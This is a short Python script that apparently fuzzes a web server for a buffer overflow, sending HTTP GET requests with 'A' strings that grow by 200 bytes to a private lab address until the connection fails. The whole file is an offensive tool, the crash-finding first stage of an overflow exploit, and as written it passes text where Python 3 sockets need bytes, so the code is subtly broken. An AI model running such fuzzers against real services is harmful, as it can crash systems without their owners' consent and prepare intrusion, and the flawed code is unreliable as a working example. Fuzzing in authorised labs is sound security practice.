import sys, socket

ip = "10.10.210.18"
port = 80

test = []
counter = 200

while len(test) < 50:
    test.append("A" * counter)
    counter += 200

for string in test:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        print(len(string))
        s.send("GET " + "/" + string + " HTTP/1.1" + "\r\n\r\n")
    except:
        print("connection error")
        sys.exit(0)


